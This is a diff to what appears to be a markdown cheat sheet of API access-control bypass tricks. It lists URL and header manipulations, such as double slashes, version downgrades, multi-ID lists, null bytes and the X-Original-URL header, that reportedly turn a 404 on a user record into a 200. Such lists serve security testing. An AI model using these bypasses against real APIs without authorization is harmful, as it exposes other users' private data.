@@ -9,43 +9,43 @@ Path normalization:
 /api/v5/users/9 => 404
 /api/v5/users/9/ => 200
 
-Double Slash
+### Double Slash
 /api/v5/users/9 => 404
 /api/v5/users/9// => 200
 
-Version downgrade
+### Version downgrade
 /api/v5/users/9 => 404
 /api/v4/users/9 => 200
 
-Endpoint variant
+### Endpoint variant
 /api/v5/users/9 => 404
 /api/v5/users/9/details => 200
 
-Multi-ID abuse
+### Multi-ID abuse
 /api/v5/users/9 => 404
 /api/v5/users/10,9 => 200
 /api/v5/users/10.9 => 200
 /api/v5/users?=10,9 => 200
 
-Type confusion
+### Type confusion
 /api/v5/users/9 => 404
 /api/v5/users/9abc => 200
 
-Leading zero
+### Leading zero
 /api/v5/users/9 => 404
 /api/v5/users/0x63 => 200
 
-NULL/Termination
+### NULL/Termination
 
 /api/v5/users/9 => 404
 /api/v5/users/9%00 => 200
 
-Header bypass
+### Header bypass
 
 /api/v5/users/9 => 404
 /api/v5/users/9 + X-ORIGINAL-URL:/api/v5/users/10 => 200
 
-Encoded space-bypass
+### Encoded space-bypass
 /api/v5/users/9 => 404
 /api/v5/users/%209 => 200
 
